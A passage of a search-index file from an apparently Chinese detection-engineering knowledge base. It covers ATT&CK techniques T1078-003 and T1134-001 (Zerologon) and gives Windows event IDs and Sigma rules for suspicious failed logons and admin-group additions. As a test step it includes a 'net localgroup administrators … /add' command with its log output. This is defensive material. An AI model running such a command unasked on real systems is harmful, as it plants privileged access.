<p>https://attack.mitre.org/techniques/T1078/003/</p>"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1078-003-win-%E5%B8%90%E6%88%B7%E7%AF%A1%E6%94%B9-%E5%8F%AF%E7%96%91%E7%9A%84%E5%A4%B1%E8%B4%A5%E7%99%BB%E5%BD%95%E5%8E%9F%E5%9B%A0/","title":"T1078-003-win-\u53ef\u7591\u7684\u5931\u8d25\u767b\u5f55\u884c\u4e3a","text":""},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1078-003-win-%E5%B8%90%E6%88%B7%E7%AF%A1%E6%94%B9-%E5%8F%AF%E7%96%91%E7%9A%84%E5%A4%B1%E8%B4%A5%E7%99%BB%E5%BD%95%E5%8E%9F%E5%9B%A0/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u4f7f\u7528\u51ed\u636e\u8bbf\u95ee\u6280\u672f\u7a83\u53d6\u7279\u5b9a\u7528\u6237\u6216\u670d\u52a1\u8d26\u53f7\u7684\u51ed\u636e\uff0c\u6216\u8005\u5728\u4fa6\u5bdf\u8fc7\u7a0b\u7684\u65e9\u671f\u901a\u8fc7\u793e\u4f1a\u5de5\u7a0b\u6355\u83b7\u51ed\u636e\u4ee5\u83b7\u5f97\u9996\u6b21\u8bbf\u95ee\u6743\u9650\u3002</p> <p>\u653b\u51fb\u8005\u53ef\u4ee5\u4f7f\u7528\u4e09\u79cd\u8d26\u53f7\uff1a\u9ed8\u8ba4\u8d26\u53f7\u3001\u672c\u5730\u8d26\u53f7\u548c\u57df\u8d26\u53f7\u3002\u9ed8\u8ba4\u8d26\u53f7\u662f\u64cd\u4f5c\u7cfb\u7edf\u7684\u5185\u7f6e\u8d26\u53f7\uff0c\u4f8b\u5982Windows\u7cfb\u7edf\u4e0a\u7684\u8bbf\u5ba2\u6216\u7ba1\u7406\u5458\u8d26\u53f7\uff0c\u6216\u8005\u5176\u4ed6\u7c7b\u578b\u7cfb\u7edf\u3001\u8f6f\u4ef6\u6216\u8bbe\u5907\u4e0a\u7684\u9ed8\u8ba4\u5de5\u5382/\u63d0\u4f9b\u5546\u8d26\u53f7\u3002\u672c\u5730\u8d26\u53f7\u662f\u7ec4\u7ec7\u914d\u7f6e\u7ed9\u7528\u6237\u3001\u8fdc\u7a0b\u652f\u6301\u6216\u670d\u52a1\u7684\u8d26\u53f7\uff0c\u6216\u5355\u4e2a\u7cfb\u7edf/\u670d\u52a1\u7684\u7ba1\u7406\u8d26\u53f7\u3002\u57df\u8d26\u53f7\u662fAD-DS\uff08\u6d3b\u52a8\u76ee\u5f55\u57df\u670d\u52a1\uff09\u7ba1\u7406\u7684\u8d26\u53f7\uff0c\u5176\u8bbf\u95ee\u548c\u6743\u9650\u5728\u57df\u5185\u4e0d\u540c\u7cfb\u7edf\u548c\u670d\u52a1\u4e4b\u95f4\u914d\u7f6e\u3002\u57df\u8d26\u53f7\u53ef\u4ee5\u6db5\u76d6\u7528\u6237\u3001\u7ba1\u7406\u5458\u548c\u670d\u52a1\u3002</p> <p>\u653b\u51fb\u8005\u53ef\u4ee5\u4f7f\u7528\u7a83\u53d6\u7684\u51ed\u636e\u7ed5\u8fc7\u7f51\u7edc\u5185\u7cfb\u7edf\u4e0a\u5404\u79cd\u8d44\u6e90\u7684\u8bbf\u95ee\u63a7\u5236\uff0c\u751a\u81f3\u53ef\u7528\u4e8e\u5bf9\u8fdc\u7a0b\u7cfb\u7edf\u548c\u5916\u90e8\u53ef\u7528\u670d\u52a1\uff08\u5982VPN\u3001Outlook Web Access\u548c\u8fdc\u7a0b\u684c\u9762\uff09\u7684\u6301\u4e45\u8bbf\u95ee\u3002\u653b\u51fb\u8005\u8fd8\u53ef\u80fd\u901a\u8fc7\u7a83\u53d6\u7684\u51ed\u636e\u83b7\u5f97\u7279\u5b9a\u7cfb\u7edf\u7684\u66f4\u591a\u6743\u9650\u6216\u7f51\u7edc\u53d7\u9650\u533a\u57df\u7684\u8bbf\u95ee\u6743\u9650\u3002\u653b\u51fb\u8005\u53ef\u4ee5\u9009\u62e9\u4e0d\u5c06\u6076\u610f\u8f6f\u4ef6\u6216\u5de5\u5177\u4e0e\u8fd9\u4e9b\u51ed\u636e\u63d0\u4f9b\u7684\u5408\u6cd5\u8bbf\u95ee\u7ed3\u5408\u4f7f\u7528\uff0c\u8fd9\u6837\u5c31\u66f4\u96be\u68c0\u6d4b\u5230\u5b83\u4eec\u7684\u5b58\u5728\u3002</p> <p>\u9ed8\u8ba4\u8d26\u53f7\u5e76\u4e0d\u9650\u4e8e\u5ba2\u6237\u7aef\u673a\u5668\u4e0a\u7684\u8bbf\u5ba2\u548c\u7ba1\u7406\u5458\uff0c\u5b83\u4eec\u8fd8\u5305\u62ec\u4e3a\u8bbe\u5907\uff08\u5982\u7f51\u7edc\u8bbe\u5907\u548c\u8ba1\u7b97\u673a\u5e94\u7528\uff09\u9884\u8bbe\u7684\u8d26\u53f7\uff0c\u65e0\u8bba\u8fd9\u4e9b\u8bbe\u5907\u662f\u5185\u90e8\u7684\u3001\u5f00\u6e90\u7684\u8fd8\u662fCOTS\u3002\u5982\u679c\u8bbe\u5907\u9884\u8bbe\u4e86\u7528\u6237\u540d\u548c\u5bc6\u7801\u7ec4\u5408\u800c\u4e14\u5b89\u88c5\u540e\u4e0d\u66f4\u6539\uff0c\u5c06\u4f1a\u5bf9\u7ec4\u7ec7\u6784\u6210\u4e25\u91cd\u5a01\u80c1\uff0c\u56e0\u4e3a\u5b83\u4eec\u5f88\u5bb9\u6613\u6210\u4e3a\u653b\u51fb\u8005\u7684\u76ee\u6807\u3002\u540c\u7406\uff0c\u653b\u51fb\u8005\u4e5f\u53ef\u80fd\u4f1a\u5229\u7528\u516c\u5f00\u62ab\u9732\u7684\u79c1\u94a5\u6216\u76d7\u53d6\u7684\u79c1\u94a5\u901a\u8fc7\u8fdc\u7a0b\u670d\u52a1\u5408\u6cd5\u5730\u8fde\u63a5\u5230\u8fdc\u7a0b\u73af\u5883\u3002</p> <p>\u6211\u4eec\u9700\u8981\u5173\u6ce8\u8de8\u7cfb\u7edf\u7f51\u7edc\u7684\u8d26\u53f7\u8bbf\u95ee\u3001\u51ed\u636e\u548c\u6743\u9650\u7684\u91cd\u53e0\uff0c\u56e0\u4e3a\u653b\u51fb\u8005\u4e5f\u8bb8\u80fd\u591f\u8de8\u8d26\u53f7\u548c\u7cfb\u7edf\u5207\u6362\u4ee5\u83b7\u5f97\u8f83\u9ad8\u7684\u8bbf\u95ee\u7ea7\u522b\uff08\u57df\u6216\u4f01\u4e1a\u7ba1\u7406\u5458\uff09\uff0c\u4ece\u800c\u7ed5\u8fc7\u4f01\u4e1a\u5185\u8bbe\u7f6e\u7684\u8bbf\u95ee\u63a7\u5236\u3002</p>"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1078-003-win-%E5%B8%90%E6%88%B7%E7%AF%A1%E6%94%B9-%E5%8F%AF%E7%96%91%E7%9A%84%E5%A4%B1%E8%B4%A5%E7%99%BB%E5%BD%95%E5%8E%9F%E5%9B%A0/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>windows\u8d26\u6237\u767b\u5f55\u5931\u8d25\u3002</p>"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1078-003-win-%E5%B8%90%E6%88%B7%E7%AF%A1%E6%94%B9-%E5%8F%AF%E7%96%91%E7%9A%84%E5%A4%B1%E8%B4%A5%E7%99%BB%E5%BD%95%E5%8E%9F%E5%9B%A0/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>windows \u5b89\u5168\u65e5\u5fd7</p>"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1078-003-win-%E5%B8%90%E6%88%B7%E7%AF%A1%E6%94%B9-%E5%8F%AF%E7%96%91%E7%9A%84%E5%A4%B1%E8%B4%A5%E7%99%BB%E5%BD%95%E5%8E%9F%E5%9B%A0/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":"<p>\u573a\u666f\u8f83\u7b80\u5355\uff0c\u8bf7\u81ea\u884c\u6d4b\u8bd5\u3002</p>"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1078-003-win-%E5%B8%90%E6%88%B7%E7%AF%A1%E6%94%B9-%E5%8F%AF%E7%96%91%E7%9A%84%E5%A4%B1%E8%B4%A5%E7%99%BB%E5%BD%95%E5%8E%9F%E5%9B%A0/#_4","title":"\u6d4b\u8bd5\u7559\u75d5","text":"<p>windows\u5b89\u5168\u4e8b\u4ef6ID\uff08win7 / win2008+\uff09</p>"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1078-003-win-%E5%B8%90%E6%88%B7%E7%AF%A1%E6%94%B9-%E5%8F%AF%E7%96%91%E7%9A%84%E5%A4%B1%E8%B4%A5%E7%99%BB%E5%BD%95%E5%8E%9F%E5%9B%A0/#_5","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":""},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1078-003-win-%E5%B8%90%E6%88%B7%E7%AF%A1%E6%94%B9-%E5%8F%AF%E7%96%91%E7%9A%84%E5%A4%B1%E8%B4%A5%E7%99%BB%E5%BD%95%E5%8E%9F%E5%9B%A0/#sigma","title":"sigma\u89c4\u5219","text":"<pre><code>title: \u5e10\u6237\u7be1\u6539-\u53ef\u7591\u7684\u5931\u8d25\u767b\u5f55\u539f\u56e0\ndescription: \u6b64\u65b9\u6cd5\u5bf9\u5931\u8d25\u7684\u767b\u5f55\u4f7f\u7528\u4e0d\u5e38\u89c1\u7684\u9519\u8bef\u4ee3\u7801\u6765\u786e\u5b9a\u53ef\u7591\u6d3b\u52a8\u5e76\u7be1\u6539\u5df2\u7981\u7528\u6216\u53d7\u67d0\u79cd\u65b9\u5f0f\u9650\u5236\u7684\u5e10\u6237\u3002\nauthor: 12306Br0(\u6d4b\u8bd5+\u7ffb\u8bd1)\ndate: 2020/06/09\nreferences:\n    - https://twitter.com/SBousseaden/status/1101431884540710913\ntags:\n    - attack.persistence\n    - attack.privilege_escalation\n    - attack.t1078\nlogsource:\n    product: windows\n    service: security\ndetection:\n    selection:\n        EventID:\n            - 4625 #\u666e\u901a\u8d26\u6237\u767b\u5f55\u5931\u8d25\n            - 4776 #\u57df\u8d26\u6237\u767b\u5f55\u5931\u8d25\n        Status:\n            - '0xC0000072'  # \u7528\u6237\u767b\u5f55\u5230\u5e10\u6237\u5df2\u88ab\u7ba1\u7406\u5458\u7981\u7528\n            - '0xC000006F'  # \u7528\u6237\u5728\u6388\u6743\u65f6\u95f4\u4e4b\u5916\u767b\u5f55\n            - '0xC0000070'  # \u7528\u6237\u4ece\u672a\u7ecf\u6388\u6743\u7684\u5de5\u4f5c\u7ad9\u767b\u5f55\n            - '0xC0000413'  # \u767b\u5f55\u5931\u8d25\uff1a\u60a8\u767b\u5f55\u7684\u8ba1\u7b97\u673a\u53d7\u5230\u8eab\u4efd\u9a8c\u8bc1\u9632\u706b\u5899\u7684\u4fdd\u62a4\u3002 \u6307\u5b9a\u7684\u5e10\u6237\u4e0d\u5141\u8bb8\u5bf9\u8ba1\u7b97\u673a\u8fdb\u884c\u8eab\u4efd\u9a8c\u8bc1\n            - '0xC000018C'  # \u767b\u5f55\u8bf7\u6c42\u5931\u8d25\uff0c\u56e0\u4e3a\u4e3b\u57df\u548c\u53ef\u4fe1\u57df\u4e4b\u95f4\u7684\u4fe1\u4efb\u5173\u7cfb\u5931\u8d25\n            - '0xC000015B'  # \u7528\u6237\u5c1a\u672a\u5728\u6b64\u8ba1\u7b97\u673a\u4e0a\u88ab\u6388\u4e88\u8bf7\u6c42\u7684\u767b\u5f55\u7c7b\u578b\uff08\u4e5f\u79f0\u4e3a\u767b\u5f55\u6743\u9650\uff09\n    condition: selection\nfalsepositives:\n    - \u4f7f\u7528\u7981\u7528\u5e10\u6237\u7684\u7528\u6237\nlevel: high\n</code></pre> <p>\u6ce8\u610f\uff1a\u6b64\u89c4\u5219\u4e3b\u8981\u662f\u9488\u5bf9\u7528\u6237\u8d26\u6237\u767b\u5f55\u5931\u8d25\u884c\u4e3a\u72b6\u6001\u7801\u8fdb\u884c\u5206\u6790\u3002</p>"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1078-003-win-%E5%B8%90%E6%88%B7%E7%AF%A1%E6%94%B9-%E5%8F%AF%E7%96%91%E7%9A%84%E5%A4%B1%E8%B4%A5%E7%99%BB%E5%BD%95%E5%8E%9F%E5%9B%A0/#_6","title":"\u5efa\u8bae","text":"<p>\u6682\u65e0</p>"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1078-003-win-%E5%B8%90%E6%88%B7%E7%AF%A1%E6%94%B9-%E5%8F%AF%E7%96%91%E7%9A%84%E5%A4%B1%E8%B4%A5%E7%99%BB%E5%BD%95%E5%8E%9F%E5%9B%A0/#_7","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1078-003</p> <p>https://attack.mitre.org/techniques/T1078/003</p>"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1078-003-win-%E6%B7%BB%E5%8A%A0%E7%94%A8%E6%88%B7%E5%88%B0%E6%9C%AC%E5%9C%B0%E7%BB%84/","title":"T1078-003-windows-\u6dfb\u52a0\u7528\u6237\u5230\u672c\u5730\u7ec4","text":""},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1078-003-win-%E6%B7%BB%E5%8A%A0%E7%94%A8%E6%88%B7%E5%88%B0%E6%9C%AC%E5%9C%B0%E7%BB%84/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u4f7f\u7528\u51ed\u636e\u8bbf\u95ee\u6280\u672f\u7a83\u53d6\u7279\u5b9a\u7528\u6237\u6216\u670d\u52a1\u8d26\u53f7\u7684\u51ed\u636e\uff0c\u6216\u8005\u5728\u4fa6\u5bdf\u8fc7\u7a0b\u7684\u65e9\u671f\u901a\u8fc7\u793e\u4f1a\u5de5\u7a0b\u6355\u83b7\u51ed\u636e\u4ee5\u83b7\u5f97\u9996\u6b21\u8bbf\u95ee\u6743\u9650\u3002</p> <p>\u653b\u51fb\u8005\u53ef\u4ee5\u4f7f\u7528\u4e09\u79cd\u8d26\u53f7\uff1a\u9ed8\u8ba4\u8d26\u53f7\u3001\u672c\u5730\u8d26\u53f7\u548c\u57df\u8d26\u53f7\u3002\u9ed8\u8ba4\u8d26\u53f7\u662f\u64cd\u4f5c\u7cfb\u7edf\u7684\u5185\u7f6e\u8d26\u53f7\uff0c\u4f8b\u5982Windows\u7cfb\u7edf\u4e0a\u7684\u8bbf\u5ba2\u6216\u7ba1\u7406\u5458\u8d26\u53f7\uff0c\u6216\u8005\u5176\u4ed6\u7c7b\u578b\u7cfb\u7edf\u3001\u8f6f\u4ef6\u6216\u8bbe\u5907\u4e0a\u7684\u9ed8\u8ba4\u5de5\u5382/\u63d0\u4f9b\u5546\u8d26\u53f7\u3002\u672c\u5730\u8d26\u53f7\u662f\u7ec4\u7ec7\u914d\u7f6e\u7ed9\u7528\u6237\u3001\u8fdc\u7a0b\u652f\u6301\u6216\u670d\u52a1\u7684\u8d26\u53f7\uff0c\u6216\u5355\u4e2a\u7cfb\u7edf/\u670d\u52a1\u7684\u7ba1\u7406\u8d26\u53f7\u3002\u57df\u8d26\u53f7\u662fAD-DS\uff08\u6d3b\u52a8\u76ee\u5f55\u57df\u670d\u52a1\uff09\u7ba1\u7406\u7684\u8d26\u53f7\uff0c\u5176\u8bbf\u95ee\u548c\u6743\u9650\u5728\u57df\u5185\u4e0d\u540c\u7cfb\u7edf\u548c\u670d\u52a1\u4e4b\u95f4\u914d\u7f6e\u3002\u57df\u8d26\u53f7\u53ef\u4ee5\u6db5\u76d6\u7528\u6237\u3001\u7ba1\u7406\u5458\u548c\u670d\u52a1\u3002</p> <p>\u653b\u51fb\u8005\u53ef\u4ee5\u4f7f\u7528\u7a83\u53d6\u7684\u51ed\u636e\u7ed5\u8fc7\u7f51\u7edc\u5185\u7cfb\u7edf\u4e0a\u5404\u79cd\u8d44\u6e90\u7684\u8bbf\u95ee\u63a7\u5236\uff0c\u751a\u81f3\u53ef\u7528\u4e8e\u5bf9\u8fdc\u7a0b\u7cfb\u7edf\u548c\u5916\u90e8\u53ef\u7528\u670d\u52a1\uff08\u5982VPN\u3001Outlook Web Access\u548c\u8fdc\u7a0b\u684c\u9762\uff09\u7684\u6301\u4e45\u8bbf\u95ee\u3002\u653b\u51fb\u8005\u8fd8\u53ef\u80fd\u901a\u8fc7\u7a83\u53d6\u7684\u51ed\u636e\u83b7\u5f97\u7279\u5b9a\u7cfb\u7edf\u7684\u66f4\u591a\u6743\u9650\u6216\u7f51\u7edc\u53d7\u9650\u533a\u57df\u7684\u8bbf\u95ee\u6743\u9650\u3002\u653b\u51fb\u8005\u53ef\u4ee5\u9009\u62e9\u4e0d\u5c06\u6076\u610f\u8f6f\u4ef6\u6216\u5de5\u5177\u4e0e\u8fd9\u4e9b\u51ed\u636e\u63d0\u4f9b\u7684\u5408\u6cd5\u8bbf\u95ee\u7ed3\u5408\u4f7f\u7528\uff0c\u8fd9\u6837\u5c31\u66f4\u96be\u68c0\u6d4b\u5230\u5b83\u4eec\u7684\u5b58\u5728\u3002</p> <p>\u9ed8\u8ba4\u8d26\u53f7\u5e76\u4e0d\u9650\u4e8e\u5ba2\u6237\u7aef\u673a\u5668\u4e0a\u7684\u8bbf\u5ba2\u548c\u7ba1\u7406\u5458\uff0c\u5b83\u4eec\u8fd8\u5305\u62ec\u4e3a\u8bbe\u5907\uff08\u5982\u7f51\u7edc\u8bbe\u5907\u548c\u8ba1\u7b97\u673a\u5e94\u7528\uff09\u9884\u8bbe\u7684\u8d26\u53f7\uff0c\u65e0\u8bba\u8fd9\u4e9b\u8bbe\u5907\u662f\u5185\u90e8\u7684\u3001\u5f00\u6e90\u7684\u8fd8\u662fCOTS\u3002\u5982\u679c\u8bbe\u5907\u9884\u8bbe\u4e86\u7528\u6237\u540d\u548c\u5bc6\u7801\u7ec4\u5408\u800c\u4e14\u5b89\u88c5\u540e\u4e0d\u66f4\u6539\uff0c\u5c06\u4f1a\u5bf9\u7ec4\u7ec7\u6784\u6210\u4e25\u91cd\u5a01\u80c1\uff0c\u56e0\u4e3a\u5b83\u4eec\u5f88\u5bb9\u6613\u6210\u4e3a\u653b\u51fb\u8005\u7684\u76ee\u6807\u3002\u540c\u7406\uff0c\u653b\u51fb\u8005\u4e5f\u53ef\u80fd\u4f1a\u5229\u7528\u516c\u5f00\u62ab\u9732\u7684\u79c1\u94a5\u6216\u76d7\u53d6\u7684\u79c1\u94a5\u901a\u8fc7\u8fdc\u7a0b\u670d\u52a1\u5408\u6cd5\u5730\u8fde\u63a5\u5230\u8fdc\u7a0b\u73af\u5883\u3002</p> <p>\u6211\u4eec\u9700\u8981\u5173\u6ce8\u8de8\u7cfb\u7edf\u7f51\u7edc\u7684\u8d26\u53f7\u8bbf\u95ee\u3001\u51ed\u636e\u548c\u6743\u9650\u7684\u91cd\u53e0\uff0c\u56e0\u4e3a\u653b\u51fb\u8005\u4e5f\u8bb8\u80fd\u591f\u8de8\u8d26\u53f7\u548c\u7cfb\u7edf\u5207\u6362\u4ee5\u83b7\u5f97\u8f83\u9ad8\u7684\u8bbf\u95ee\u7ea7\u522b\uff08\u57df\u6216\u4f01\u4e1a\u7ba1\u7406\u5458\uff09\uff0c\u4ece\u800c\u7ed5\u8fc7\u4f01\u4e1a\u5185\u8bbe\u7f6e\u7684\u8bbf\u95ee\u63a7\u5236\u3002</p>"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1078-003-win-%E6%B7%BB%E5%8A%A0%E7%94%A8%E6%88%B7%E5%88%B0%E6%9C%AC%E5%9C%B0%E7%BB%84/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>\u6dfb\u52a0\u7528\u6237\u5230\u672c\u5730\u7ba1\u7406\u7ec4</p>"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1078-003-win-%E6%B7%BB%E5%8A%A0%E7%94%A8%E6%88%B7%E5%88%B0%E6%9C%AC%E5%9C%B0%E7%BB%84/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>windows \u5b89\u5168\u65e5\u5fd7</p>"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1078-003-win-%E6%B7%BB%E5%8A%A0%E7%94%A8%E6%88%B7%E5%88%B0%E6%9C%AC%E5%9C%B0%E7%BB%84/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":"<pre><code>C:\\Windows\\system32&gt;net localgroup administrators admin09 /add\n\u547d\u4ee4\u6210\u529f\u5b8c\u6210\u3002\n</code></pre>"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1078-003-win-%E6%B7%BB%E5%8A%A0%E7%94%A8%E6%88%B7%E5%88%B0%E6%9C%AC%E5%9C%B0%E7%BB%84/#_4","title":"\u6d4b\u8bd5\u7559\u75d5","text":"<pre><code>\u5df2\u5411\u542f\u7528\u4e86\u5b89\u5168\u6027\u7684\u672c\u5730\u7ec4\u4e2d\u6dfb\u52a0\u67d0\u4e2a\u6210\u5458\u3002\n\n\u4e3b\u9898:\n \u5b89\u5168 ID: 12306Br0-PC\\12306Br0\n \u5e10\u6237\u540d: 12306Br0\n \u5e10\u6237\u57df: 12306Br0-PC\n \u767b\u5f55 ID: 0x51893\n\n\u6210\u5458:\n \u5b89\u5168 ID: 12306Br0-PC\\admin09\n \u5e10\u6237\u540d: -\n\n\u7ec4:\n \u5b89\u5168 ID: BUILTIN\\Administrators\n \u7ec4\u540d: Administrators\n \u7ec4\u57df: Builtin\n\n\u9644\u52a0\u4fe1\u606f:\n \u7279\u6743: -\n</code></pre>"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1078-003-win-%E6%B7%BB%E5%8A%A0%E7%94%A8%E6%88%B7%E5%88%B0%E6%9C%AC%E5%9C%B0%E7%BB%84/#_5","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":""},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1078-003-win-%E6%B7%BB%E5%8A%A0%E7%94%A8%E6%88%B7%E5%88%B0%E6%9C%AC%E5%9C%B0%E7%BB%84/#sigma","title":"sigma\u89c4\u5219","text":"<pre><code>title: \u6dfb\u52a0\u7528\u6237\u5230\u672c\u5730\u7ec4\ndescription: \u6b64\u89c4\u5219\u89e6\u53d1\u6dfb\u52a0\u5230\u672c\u5730Administrators\u7ec4\u7684\u7528\u6237\u5e10\u6237\uff0c\u8fd9\u53ef\u80fd\u662f\u5408\u6cd5\u6d3b\u52a8\u6216\u7279\u6743\u5347\u7ea7\u6d3b\u52a8\u7684\u6807\u5fd7\u3002\nstatus: stable\nauthor: 12306Br0(\u6d4b\u8bd5+\u7ffb\u8bd1)\ndate: 2020/06/08\ntags:\n    - attack.privilege_escalation\n    - attack.t1078\nlogsource:\n    product: windows\n    service: security\ndetection:\n    selection:\n        EventID: \n        - \u201c4732\u201d #\u4e00\u540d\u7528\u6237\u88ab\u6dfb\u52a0\u5230\u5b89\u5168\u672c\u5730\u7ec4\n        - \u201d4720\u201c # \u5df2\u521b\u5efa\u7528\u6237\u5e10\u6237\n    selection_group1:\n        GroupName: 'Administrators' #\u7ec4\u540d\n    filter:\n        SubjectUserName: '*$'\n    condition: selection and (1 of selection_group*) and not filter\nfalsepositives:\n    - \u5408\u6cd5\u7528\u6237\u6d3b\u52a8\nlevel: medium\n</code></pre>"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1078-003-win-%E6%B7%BB%E5%8A%A0%E7%94%A8%E6%88%B7%E5%88%B0%E6%9C%AC%E5%9C%B0%E7%BB%84/#_6","title":"\u5efa\u8bae","text":"<p>\u68c0\u6d4b\u65b9\u6cd5\u9664\u4e864732\u4e4b\u5916\uff0c\u4e5f\u53ef\u4ee5\u901a\u8fc74720\u6765\u8fdb\u884c\u68c0\u6d4b\u3002</p>"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1078-003-win-%E6%B7%BB%E5%8A%A0%E7%94%A8%E6%88%B7%E5%88%B0%E6%9C%AC%E5%9C%B0%E7%BB%84/#_7","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1078-003</p> <p>https://attack.mitre.org/techniques/T1078/003</p>"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1134-001-win-CVE-2020-1472/","title":"T1134-001-win-CVE-2020-1472","text":""},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1134-001-win-CVE-2020-1472/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u590d\u5236\uff0c\u7136\u540e\u5192\u5145\u53e6\u4e00\u4e2a\u7528\u6237\u7684\u4ee4\u724c\u4ee5\u63d0\u5347\u7279\u6743\u5e76\u7ed5\u8fc7\u8bbf\u95ee\u63a7\u5236\u3002\u653b\u51fb\u8005\u53ef\u4ee5\u521b\u5efa\u4e00\u4e2a\u65b0\u7684\u8bbf\u95ee\u4ee4\u724c\uff0c\u8be5\u4ee4\u724c\u4f7f\u7528\u6765\u590d\u5236\u73b0\u6709\u4ee4\u724cDuplicateToken(Ex)\u3002\u7136\u540e\u53ef\u4ee5\u5c06\u8be5\u4ee4\u724c\u7528\u4e8eImpersonateLoggedOnUser\u5141\u8bb8\u8c03\u7528\u7ebf\u7a0b\u6a21\u62df\u5df2\u767b\u5f55\u7528\u6237\u7684\u5b89\u5168\u4e0a\u4e0b\u6587\uff0c\u6216\u8005SetThreadToken\u7528\u4e8e\u5c06\u6a21\u62df\u4ee4\u724c\u5206\u914d\u7ed9\u7ebf\u7a0b\u3002</p> <p>\u5f53\u653b\u51fb\u8005\u5177\u6709\u8981\u5c06\u65b0\u4ee4\u724c\u5206\u914d\u7ed9\u7684\u7279\u5b9a\u73b0\u6709\u8fc7\u7a0b\u65f6\uff0c\u4ed6\u4eec\u53ef\u4ee5\u6267\u884c\u6b64\u64cd\u4f5c\u3002\u4f8b\u5982\uff0c\u5f53\u76ee\u6807\u7528\u6237\u5728\u7cfb\u7edf\u4e0a\u5177\u6709\u975e\u7f51\u7edc\u767b\u5f55\u4f1a\u8bdd\u65f6\uff0c\u8fd9\u53ef\u80fd\u5f88\u6709\u7528\u3002</p>"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1134-001-win-CVE-2020-1472/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>2020\u5e749\u670811\u65e5\uff0c\u5b89\u5168\u7814\u7a76\u5458Secura\u53d1\u5e03\u4e86\u516c\u544a\uff0c\u9610\u660e\u4e86Microsoft\u57282020\u5e748\u6708\u4fee\u8865\u7684\u6f0f\u6d1e\u7ec6\u8282\uff08CVE-2020-1472\uff09\u3002\u8be5\u6f0f\u6d1e\u4e5f\u79f0\u4e3a\u201cZerologon\u201d\uff0cCVSS\u8bc4\u5206\u4e3a10.0\uff0c\u53f7\u79f03\u79d2\u64b8\u57df\u63a7\uff0c\u5371\u5bb3\u4e25\u91cd\u3002\u653b\u51fb\u8005\u5728\u901a\u8fc7NetLogon\uff08MS-NRPC\uff09\u534f\u8bae\u4e0eAD\u57df\u63a7\u5efa\u7acb\u5b89\u5168\u901a\u9053\u65f6\uff0c\u53ef\u5229\u7528\u8be5\u6f0f\u6d1e\u5c06AD\u57df\u63a7\u7684\u8ba1\u7b97\u673a\u8d26\u53f7\u5bc6\u7801\u7f6e\u4e3a\u7a7a\uff0c\u4ece\u800c\u63a7\u5236\u57df\u63a7\u670d\u52a1\u5668\u3002\u672c\u6587\u5c06\u4ece\u201cZerologon\u201d\u6f0f\u6d1e\u539f\u7406\u3001\u6f0f\u6d1e\u590d\u73b0\u3001\u5a01\u80c1\u72e9\u730e\u4e09\u4e2a\u7ef4\u5ea6\u5bf9\u8be5\u6f0f\u6d1e\u8fdb\u884c\u5206\u6790\u3002</p> <p>\u5177\u4f53\u53ef\u53c2\u8003\u5b89\u5168\u5ba2\u76f8\u5173\u6587\u7ae0\uff0c\u4f20\u9001\u95e8</p>"},{"location":"0x6_%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/T1134-001-win-CVE-2020-1472/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>Windows \u7cfb\u7edf\u65e5\u5fd7\u3001\u5168\u6d41\u91cf</p> <p>\u6b64\u5916\uff0c\u57288\u6708\u4efd\u7684\u8865\u4e01\u4e2d\uff0cMicrosoft\u6dfb\u52a0\u4e86\u4e94\u4e2a\u65b0\u7684event ID\uff0c\u4ee5\u901a\u77e5\u6613\u53d7\u653b\u51fb\u7684Netlogon\u8fde\u63a5\uff1a</p> 